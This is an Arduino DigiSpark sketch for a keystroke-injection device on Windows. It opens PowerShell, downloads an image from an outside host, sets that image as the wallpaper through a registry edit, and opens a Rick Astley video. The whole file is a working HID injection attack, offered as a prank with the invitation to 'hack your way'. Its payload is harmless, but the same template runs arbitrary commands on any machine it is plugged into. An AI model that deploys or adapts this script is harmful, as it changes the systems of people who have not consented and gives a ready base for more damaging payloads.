/*
 * Date: 08.06.2018
 * Author: __z01db3rg
 * Title: __c0rn3lPlague1
 * Description: Using an arduino DigiSpark changes the wallpaper to one 
 * that says you got rick roll'd and then opens the browser and plays an
 * 1 hour compilation of Never Gonna Give You Up - Rick Astley
 * Compatibility: win10/win7
 * Variables for integration with what you want:
 * Just hack your way =))))))))
 */
#include "DigiKeyboard.h"

int delayPause = 500;

void setup() {
  //empty
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.print("$client.DownloadFile(\"http://i0.kym-cdn.com/photos/images/facebook/000/276/668/ad3.jpg\" , \"__c0rn3l.jpg\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\__c0rn3l.jpg\" /f");
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.print("https://youtu.be/IC5YozmvPpM?t=20s");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
